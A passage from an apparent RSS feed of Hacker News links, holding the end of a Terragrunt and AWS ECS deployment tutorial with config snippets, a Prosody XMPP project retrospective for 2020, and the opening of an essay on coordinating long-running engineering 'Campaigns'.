<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">tf › main ›</span></span><span data-v-594b4fde="">account.terragrunt.hcl</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8=""># Set account-specific variables. They are automatically</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8=""># pulled in to configure the remote state bucket in the root</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8=""># terragrunt.hcl configuration.</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">locals</span><span data-v-3d5c50e8=""> {</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">  account_name   </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"main"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">  aws_account_id </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"123456789000"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">  aws_profile    </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"default"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">}</span></span></code></pre></div>
<p data-v-3d5c50e8="">Similarly, the region configuration is provided in the nested level:</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">tf › main › eu-west-1 ›</span></span><span data-v-594b4fde="">region.terragrunt.hcl</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8=""># Set region-specific variables. They are automatically</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8=""># pulled in to the root terragrunt.hcl configuration to</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8=""># feed forward to the child modules.</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">locals</span><span data-v-3d5c50e8=""> {</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    aws_region </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"eu-west-1"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">}</span></span></code></pre></div>
<p data-v-3d5c50e8="">Environment configuration regarding both infrastructure and containers are provided in the nested level. To illustrate a common use case: The <code data-v-3d5c50e8="">stage</code> environment may override variables previously defined in the parent-hierarchy, in <code data-v-3d5c50e8="">tf/common.terragrunt.hcl</code>, and for instance add a prefix <code data-v-3d5c50e8="">stage.*</code> to <code data-v-3d5c50e8="">app_domain_name</code>.</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">tf › main › eu-west-1 › stage ›</span></span><span data-v-594b4fde="">environment.terragrunt.hcl</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8=""># Set environment-specific variables. They are automatically</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8=""># pulled in to the root terragrunt.hcl configuration to</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8=""># feed forward to the child modules.</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">locals</span><span data-v-3d5c50e8=""> {</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    common </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> read_terragrunt_config(find_in_parent_folders(</span><span data-v-3d5c50e8="">"common.terragrunt.hcl"</span><span data-v-3d5c50e8="">))</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">    account </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> read_terragrunt_config(find_in_parent_folders(</span><span data-v-3d5c50e8="">"account.terragrunt.hcl"</span><span data-v-3d5c50e8="">))</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    region </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> read_terragrunt_config(find_in_parent_folders(</span><span data-v-3d5c50e8="">"region.terragrunt.hcl"</span><span data-v-3d5c50e8="">))</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8=""># Configure environment</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">    environment </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"stage"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">    app_domain_name </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"stage.</span><span data-v-3d5c50e8="">${local</span><span data-v-3d5c50e8="">.common.locals.app_domain_name</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">"</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">    app_name </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> local</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">common</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">locals</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">app_name</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">    aws_account_id </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> local</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">account</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">locals</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">aws_account_id</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">13</span><span data-v-3d5c50e8="">    aws_region </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> local</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">region</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">locals</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">aws_region</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">14</span><span data-v-3d5c50e8="">    parameter_group </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"</span><span data-v-3d5c50e8="">${local</span><span data-v-3d5c50e8="">.app_name</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">/</span><span data-v-3d5c50e8="">${local</span><span data-v-3d5c50e8="">.environment</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">"</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">15</span><span data-v-3d5c50e8="">    service_configuration </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> {</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">16</span><span data-v-3d5c50e8="">        # ...</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">17</span><span data-v-3d5c50e8="">    }</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">18</span><span data-v-3d5c50e8="">}</span></span></code></pre></div>
<h2 id="configure-container-environment-and-secrets" data-v-3d5c50e8="">Configure Container Environment and Secrets</h2>
<p data-v-3d5c50e8="">Environment variables for the respective deployment target (e.g., for <code data-v-3d5c50e8="">stage</code> environment) are provided alongside terragrunt configuration in JSON files, following the naming <code data-v-3d5c50e8="">.service.environment.json</code>, and by specifying both keys and values. These files are committed to source control, since they do not contain any sensitive data. Adding a description key-value pair will inform development and ensure consistency of variable assignment.</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">tf › main › eu-west-1 › stage ›</span></span><span data-v-594b4fde="">.api.environment.json</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">{</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">  </span><span data-v-3d5c50e8="">"DEBUG"</span><span data-v-3d5c50e8="">: {</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">"value"</span><span data-v-3d5c50e8="">: </span><span data-v-3d5c50e8="">"true"</span><span data-v-3d5c50e8="">,</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">"description"</span><span data-v-3d5c50e8="">: </span><span data-v-3d5c50e8="">"API debug environment"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">  }</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">  </span><span data-v-3d5c50e8="">// ...</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">}</span></span></code></pre></div>
<p data-v-3d5c50e8="">Similarly, JSON files following the naming <code data-v-3d5c50e8="">.service.secrets.json</code> provide <em data-v-3d5c50e8="">keys</em> (not values) for all container secrets, which are injected by AWS Systems Manager Parameter Store into the service's ECS tasks (containers) as <em data-v-3d5c50e8="">environment variables</em>. Adding a description key-value pair will inform development and ensure consistency of variable assignment.</p>
<p data-v-3d5c50e8="">No secrets are present in code or source control — secrets such as database passwords or secret keys are generated as terraform resources, and stored within Systems Manager Parameter Store. Following the <a href="https://www.terraform.io/docs/state/sensitive-data.html" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">design of terraform state</a>, they are additionally stored within remote state backend. While S3 backend supports encryption at rest, remote state is to be considered sensitive data.</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">tf › main › eu-west-1 › stage ›</span></span><span data-v-594b4fde="">.api.secrets.json</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">{</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">  </span><span data-v-3d5c50e8="">"SECRET_KEY"</span><span data-v-3d5c50e8="">: {</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">"description"</span><span data-v-3d5c50e8="">: </span><span data-v-3d5c50e8="">"Secret key required for API JWT authentication"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">  }</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">  </span><span data-v-3d5c50e8="">// ...</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">}</span></span></code></pre></div>
<h2 id="integration-via-github-actions--pytest" data-v-3d5c50e8="">Integration via GitHub Actions – Pytest</h2>
<p data-v-3d5c50e8="">Easily add continuous integration workflows for unit, integration, and e2e tests by adding a GitHub Action workflow. The <a href="https://github.com/visini/terragrunt-github-actions-aws-ecs" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">companion repository</a> includes an example for testing the API service via Pytest.</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">.github › workflows ›</span></span><span data-v-594b4fde="">pytest-api.yml</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">name</span><span data-v-3d5c50e8="">: </span><span data-v-3d5c50e8="">Pytest API</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">on</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">  </span><span data-v-3d5c50e8="">pull_request</span><span data-v-3d5c50e8="">:</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">jobs</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">  </span><span data-v-3d5c50e8=""># ----------------------------------------------------------------</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">  </span><span data-v-3d5c50e8=""># …</span></span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://camillovisini.com/article/terragrunt-github-actions-aws-ecs/">https://camillovisini.com/article/terragrunt-github-actions-aws-ecs/</a></em></p>]]>
            </description>
            <link>https://camillovisini.com/article/terragrunt-github-actions-aws-ecs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713700</guid>
            <pubDate>Sun, 10 Jan 2021 11:40:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Prosody developers spent 2020]]>
            </title>
            <description>
<![CDATA[
Score 69 | Comments 40 (<a href="https://news.ycombinator.com/item?id=25713679">thread link</a>) | @upofadown
<br/>
January 10, 2021 | https://blog.prosody.im/2020-retrospective/ | <a href="https://web.archive.org/web/*/https://blog.prosody.im/2020-retrospective/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          
  


  <div>

    

    
    <div>
      <p><small>
        <p><time datetime="2021-01-08T00:00:00Z">
          2021-01-08
        </time> by The Prosody Team
         
        <br>
        
        </p>
        

        
        
        <br>

      </small></p>
    </div>
    <p>Nobody here knew quite what a year 2020 was going to be! However despite
pandemics and lockdowns, we have continued to work on Prosody. This post
is a summary of how the project is doing, and what we’ve been up to in
the past year.</p>

<p>One quick note before we begin… Prosody is an independent open-source
project and exists only because the developers have been fortunate enough
to be in a position to work on it. A couple of core team members are
currently looking for freelance work. If you have projects in need of a
Prosody expert, check the bottom of this post for more details!</p>

<h2 id="more-users-than-ever-before">More users than ever before</h2>

<p>Prosody does not “phone home” in any way, which means we do not have a
lot of insight into how many people are using Prosody. But there are
some indicators that we can use to see at least the growth of the project.</p>

<p>Many years ago, circa 2014, I was filling out a form that asked how
many users the project had. I thought long and hard, but with no idea how
to measure, I wrote down an estimate of “500” based on nothing but a gut
feeling. Only a few weeks later I learned that the <a href="https://xmpp.net/">XMPP Observatory</a>
had already seen <strong>over 2200 domains</strong> submitted that were running Prosody.
As most deployments were unlikely to have been submitted to xmpp.net, my
estimate was clearly far out. These days I jump at any chance for even a
vague estimate of our userbase. It helps us to know that people are out
there!</p>

<p>One useful tool is <a href="https://shodan.io/">Shodan</a>. This project scans the
entire internet, just to see what it can find, and it records the results.
Often used by academics and security researchers, a free account can also
be used by anyone to run simple queries over the data they collect.</p>

<p>A Shodan search in 2017 turned up nearly 7000 Prosody deployments. The
same search 8 months later returned over 16000. Today we’re at <strong>over 52000
Prosody servers!</strong> And this only counts instances using port 5269 and
accessible to the internet. There are also many private/internal deployments
of Prosody that are not included in these numbers. Unfortunately we
didn’t run a report in 2019, but here’s a graph of the previous
reports we have run:</p>

<p><img src="https://blog.prosody.im/2020-retrospective/prosody-shodan-2020.svg" alt="Graph of Prosody server counts in previous paragraph"></p>

<p>Shodan reports over 85000 federating XMPP servers on port 5269 in total.
Based on this, Prosody makes up 44% of the public XMPP network. That’s
quite an achievement!</p>

<p>Another handy insight into one sector of Prosody deployments is via Debian’s
<a href="https://popcon.debian.org/">“popularity contest”</a> service. This is an
automated survey that administrators of Debian servers can choose to opt
into. It reports anonymously to Debian what software packages are installed
and in use. Although it reflects only a small slice of even Debian
installations, it is useful to see trends.</p>

<p>March 2020 marked an unprecedented spike in Prosody installations!</p>

<p><img src="https://blog.prosody.im/2020-retrospective/prosody-popcon-20201231.png" alt="Graph of Debian popularity contest data for prosody"></p>

<p>Although we don’t know for certain, we suspect this was caused by an surge
of interest in the self-hosted video conferencing software, <a href="https://jitsi.org/jitsi-meet/">Jitsi Meet</a>. Jitsi Meet integrates with Prosody, which is used to power the
authentication, signaling and chat of the video conferences. Jitsi’s <a href="https://jitsi.org/jitsi-videobridge/">Videobridge</a> component handles the media routing. Together they make
a very powerful and flexible communication system, and it is hardly surprising
that interest has spiked this year when there has been a massive shift to
remote work, and online meetings have replaced physical ones.</p>

<h2 id="the-code-counts">The code counts</h2>

<p>Now let’s look at some stats about the Prosody codebase itself.</p>

<table>
<thead>
<tr>
<th>Language</th>
<th>Files</th>
<th>Code</th>
<th>Comment</th>
<th>Comment %</th>
<th>Blank</th>
<th>Total</th>
</tr>
</thead>

<tbody>
<tr>
<td>Lua</td>
<td>295</td>
<td>48358</td>
<td>3536</td>
<td>6.8%</td>
<td>6483</td>
<td>58377</td>
</tr>

<tr>
<td>C</td>
<td>13</td>
<td>2613</td>
<td>346</td>
<td>11.7%</td>
<td>643</td>
<td>3602</td>
</tr>

<tr>
<td>Other (build tools, etc.)</td>
<td>11</td>
<td>1551</td>
<td>22</td>
<td>6.3%</td>
<td>138</td>
<td>1711</td>
</tr>

<tr>
<td>————————-</td>
<td>——</td>
<td>———-</td>
<td>———-</td>
<td>———-</td>
<td>———-</td>
<td>———</td>
</tr>

<tr>
<td>Total</td>
<td>323</td>
<td>54760</td>
<td>3909</td>
<td>6.7%</td>
<td>7265</td>
<td>65934</td>
</tr>
</tbody>
</table>

<h3 id="changes-in-2020">Changes in 2020</h3>

<p>In 2020 (looking at the development branch) we added 597 commits, changing
191 files. The changes added 9872 lines of code, and 3637 lines of code
were removed.</p>

<p>A significant portion of the new lines were in our unit and integration
tests (2200 lines, about 22%) which we have been working hard to expand
over the past couple of years.</p>



<p>If you use Prosody, you know we have an emphasis on modularity and
extensibility. We like to make <a href="https://prosody.im/doc/developers/modules">developing plugins for Prosody</a> as easy as possible, whether it’s for integration with other
systems or crazy experiments.</p>

<p>Here’s a random selection of the 363 modules currently in the repository:</p>

<dl>
<dt><a href="https://modules.prosody.im/mod_muc_eventsource">mod_muc_eventsource</a></dt>
<dd>Receive messages from MUC rooms with 4 lines of Javascript</dd>
<dt><a href="https://modules.prosody.im/mod_log_ringbuffer.html">mod_log_ringbuffer</a></dt>
<dd>Send debug logs to RAM unless they are needed.</dd>
<dt><a href="https://modules.prosody.im/mod_component_client">mod_component_client</a></dt>
<dd>Allow a Prosody server to run as a (XEP-0114) external component of
another (Prosody or not) XMPP server.</dd>
<dt><a href="https://modules.prosody.im/mod_firewall">mod_firewall</a></dt>
<dd>Powerful rules-based scripts for filtering and redirecting XMPP traffic.</dd>
<dt><a href="https://modules.prosody.im/mod_minimix">mod_minimix</a></dt>
<dd>An <strong>experiment</strong> in making MUC joins persistent (like MIX).</dd>
</dl>

<p>During 2020 we saw 37 new modules published in the <a href="https://modules.prosody.im/">community repository</a>,
and 499 commits from 19 contributors. Together they added over 10,000
lines of code (and removed 728 lines). This makes it our most active
year apart from 2018!</p>

<p>Outside of the Prosody dev team, the most active contributor was
<a href="https://wiki.xmpp.org/web/Severino_Ferrer_de_la_Pe%C3%B1ita_Application_2020">Seve</a>, who also made their first contribution this year and added a total of four new modules.
Welcome aboard!</p>

<h2 id="features">Features</h2>

<p>But the most important part… what features have we been working on? All
these things are scheduled for the 0.12 release (more on that in a bit).</p>

<h3 id="plugin-installer">Plugin installer</h3>

<p>We have been applying further polish to, and setting up the infrastructure
for the plugin installer. This was a Google Summer of Code project by
<a href="https://gsoc-prosody-2019.blogspot.com/">João Duarte</a>. It utilizes the
Lua package manager, LuaRocks, to download, install and manage community
modules.</p>

<p>Although the the installer was completed in 2019, to make it generally
usable we also had to ensure every module in the <a href="https://modules.prosody.im/">community repository</a>
could be packaged and served in an automated way by our server. We now
have this working.</p>

<h3 id="bye-bye-telnet-hello-prosodyctl-shell">Bye bye telnet, hello prosodyctl shell!</h3>

<p>The telnet console is one of the best things about Prosody, and we’ve
been working on its successor. An early version of <code>prosodyctl shell</code> is
already available to try out in trunk nightly builds.</p>

<p>Using prosodyctl allows us to more easily support advanced features such
as line editing and history (previously attainable using a third-party
utility, rlwrap). It also allows for some richer UIs and is more secure
on shared servers (it uses a unix socket instead of TCP).</p>

<h3 id="dns-improvements">DNS improvements</h3>

<p>Since Prosody needs to resolve special DNS record types (such as SRV
records) and in an asynchronous manner, the built-in operating system APIs
are generally inadequate.</p>

<p>For a long time we’ve been using an adopted library simply known as
‘dns.lua’ combined with our own asynchronous wrapper around it. Although
it hasn’t been terrible, it has a few issues, especially in some uncommon
environments. It also doesn’t support many advanced features such as DNSSEC.</p>

<p>Now we are migrating to libunbound, part of the <a href="https://github.com/coredns/unbound">unbound</a>
project. This is one of the leading DNS implementations, and will be a
big improvement over our current DNS library. To try it out, you can
simply install <a href="https://www.zash.se/luaunbound.html">luaunbound</a> (already
available in luarocks, Debian testing, AUR and others - poke your distro
maintainers if you don’t have it yet!).</p>

<h3 id="http-server-upload-performance">HTTP server upload performance</h3>

<p>We didn’t set out to write a HTTP server, but we ended up with one anyway!
Originally added so that we could natively support BOSH (XMPP over HTTP)
clients, it grew to support websockets, and various modules now provide
HTTP APIs for integration between Prosody and other systems.</p>

<p>One big problem is that the original implementation was designed for only
small amounts of data. Since the widespread of adoption of
<a href="https://xmpp.org/extensions/xep-0363.html">XEP-0363</a> people now want to
be able to upload files, pictures and videos using Prosody’s internal
HTTP server. We have limits in place to protect against denial of service
attacks, but those same limits prevent large uploads from trusted users.</p>

<p>We’ve put some work into supporting “streaming uploads”, where incoming
data can be saved directly to disk instead of RAM. This means it will be
safe to increase file upload limits without opening up your server to
increase RAM usage and denial of service attacks.</p>

<p>In general though, we do recommend using a real external HTTP server in
a production or high traffic deployment (using <a href="https://modules.prosody.im/mod_http_upload_external">mod_http_upload_external</a>).</p>

<h3 id="beyond-passwords">Beyond passwords</h3>

<p>Passwords are the fundamental means of authenticating to your server in
XMPP today. XMPP is quite good at this, adopting strong standard authentication
mechanisms such as SCRAM far earlier than the rest of the industry. But
the rest of the industry is also moving away from passwords in many places.
We’re aiming to follow this movement also. Not that we are scrapping passwords
entirely, but making it easier to offer alternatives.</p>

<p>Prosody actually has a number of non-password authentication modules already,
such as <a href="https://modules.prosody.im/mod_auth_oauthbearer">mod_auth_oauthbearer</a> (OAuth2 tokens),
 <a href="https://modules.prosody.im/mod_auth_ccert">mod_auth_ccert</a> (client certificates) and
 <a href="https://modules.prosody.im/mod_auth_token">mod_auth_token</a> (HMAC-based
 tokens).
But most of the modules have limitations and are not well integrated
(e.g. you can set up Prosody to accept passwords, or set it up to accept
tokens, but you can’t offer both methods at the same time).</p>

<p>An important related aspect is authorization. In most systems authentication
via a token also provides <em>limited access to the account</em> (e.g. if a password
is associated with an account, a session that logged in using a token
should not be allowed to reset the password).</p>

<p>We’ve been working on two things. Firstly, a built-in authorization system
(more flexible than the current <code>admins</code> configuration option) where users
and sessions can be associated with specific permissions and roles.</p>

<p>Secondly we’re using this authorization layer to add built-in support
for OAuth2-style authentication and authorization.</p>

<p>This is exciting for a number of reasons. It will allow, for example,
specialized clients to request and receive (when granted by the user)
limited …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.prosody.im/2020-retrospective/">https://blog.prosody.im/2020-retrospective/</a></em></p>]]>
            </description>
            <link>https://blog.prosody.im/2020-retrospective/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713679</guid>
            <pubDate>Sun, 10 Jan 2021 11:37:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Campaigns: A long-running effort to enact global change safely]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25713656">thread link</a>) | @kiyanwang
<br/>
January 10, 2021 | https://kellysutton.com/2021/01/06/campaigns.html | <a href="https://web.archive.org/web/*/https://kellysutton.com/2021/01/06/campaigns.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  

  <article>
    <p>Sometimes it can take years to make a single-line code change.</p>

<p>As engineering organizations grow, the problems and their solutions become more intricate. What might have taken an afternoon now takes months of coordinated effort. The system (both the technology and the people) are larger, more complex, and more difficult to change than ever before.</p>

<p>But change is necessary.</p>

<p>We might be looking to pay off some technical debt or tee up an architectural change to unlock a better customer experience, cost savings, etc. What is a tool we can use to coordinate many groups of people, hold groups accountable, and eventually succeed?</p>

<p>Enter what I call the <strong>Campaign</strong>.</p>

<h2 id="elements-of-a-campaign">Elements of a Campaign</h2>

<p>A Campaign is a long-running effort to enact global change safely within a sociotechnical system.</p>

<p><strong>Every campaign needs the following:</strong></p>

<ul>
  <li>A Goal</li>
  <li>Metrics toward that goal</li>
  <li>Buy-in</li>
  <li>Method of Accountability</li>
  <li>A “Window”</li>
  <li>A Target Date</li>
</ul>

<p><strong>Campaigns work well to address:</strong></p>

<ul>
  <li>Technical changes with large social components.</li>
  <li>Technical changes that require everyone to do a little bit of work.</li>
  <li>High-value or inevitable future worlds</li>
</ul>

<p><strong>Campaigns don’t work with:</strong></p>

<ul>
  <li>Efforts that avoid measurement, or where measurement is likely actively harmful. Examples include “We should improve the design of our code.”</li>
  <li>Organizations that cannot buy-in to the effort for one reason or another.</li>
  <li>Low-value Campaigns. No need to coordinate many teams if efforts can be localized.</li>
</ul>

<p>Many campaigns have a trivial technical goal. My favorite example: The request timeout value is likely one line in a configuration file. Safely changing that to a lower value can be months of work.</p>

<p>Let’s step through the individal components in greater detail.</p>

<h2 id="the-goal">The Goal</h2>

<p>Every campaign needs a goal that can be expressed in a single sentence. The goal should be separate from the metric. It may or may not include implementation details. I usually recommend they include some hint of implementation so that the scope of effort can be limited a bit.</p>

<p>Here are a few examples:</p>

<ul>
  <li>“We want to improve the resiliency and throughput of our background processes by making all jobs idempotent.”</li>
  <li>“We want to improve the customer experience and resiliency of our system by limiting the amount of time a web request can take.”</li>
  <li>“We want to improve the health of our database by enforcing a timeout on all queries.”</li>
</ul>

<p>If the goal feels a bit too open, consider adding non-goals as well to keep the effort focused.</p>

<h2 id="focus-on-impact">Focus on Impact</h2>

<p>Before beginning a Campaign, you need to convice a lot of people that this is a valuable effort and that now is the right time to tackle such an effort. A crisp articulation of “Why this Campaign?” and “Why now?” is required.</p>

<p>Write these down, but expect to repeat them in other media often.</p>

<p>Focus on the benefits of achieving the goal. The more we can ground the impact in objective truths (e.g. “our system is more resilient to failure”) and less in personal preference for technology (e.g. “we were using Tech X but now we use Tech Y”), the better.</p>

<h2 id="metrics">Metrics</h2>

<p>Every Campaign needs a metric or two to enable tracking progress and accountability.</p>

<p>Each metric should be able to be assigned to a given team or individual. Once the metrics go green, we should have <em>ipso facto</em> achieved our goal.<sup id="fnref:okrs" role="doc-noteref"><a href="#fn:okrs">1</a></sup></p>

<p>Choosing a metric can be difficult. It should not be succeptible to <a href="https://brownfield.dev/post/2020-02-18-trap-rule-beating/">Rule Beating</a>, where the metric will be green but the intent of the goal will be missed.</p>

<p>Metrics need to be incremental and as fine-grained as necessary. We should see the slow march of progress, rather than a sudden “Okay, we’re done!”</p>

<p>There should be many ways to achieve a metric. In the example of global request timeouts, we can hit that timeout by reducing the total number of database queries, speeding up serialization of JSON, caching, loading less data, etc.</p>

<p>A few examples derived from the above examples goals:</p>

<ul>
  <li>Number of background jobs that are not idempotent.</li>
  <li>Endpoints that are over the threshold of request length.</li>
  <li>Database queries that are over the threshold of query length.</li>
</ul>

